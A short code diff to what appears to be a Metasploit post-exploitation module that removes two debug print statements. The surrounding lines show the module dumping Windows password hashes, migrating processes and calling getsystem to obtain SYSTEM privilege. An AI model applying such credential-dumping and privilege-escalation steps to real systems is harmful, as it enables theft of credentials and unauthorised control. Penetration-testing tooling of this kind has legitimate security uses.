@@ -403,7 +403,7 @@ class Metasploit3 < Msf::Post
 						file_local_write(pwdfile,inject_hashdump)
 					rescue::Exception => e
 						print_error("Failed to dump hashes as SYSTEM, trying to migrate to another process")
-						puts(e)
+						
 						if sysinfo['OS'] =~ /(Windows 2008)/i
 							move_to_sys
 							file_local_write(pwdfile,inject_hashdump)
@@ -462,7 +462,6 @@ class Metasploit3 < Msf::Post
 					end
 
 				else
-					puts migrate_system
 					if migrate_system
 						print_status("Trying to get SYSTEM Privilege")
 						results = session.priv.getsystem
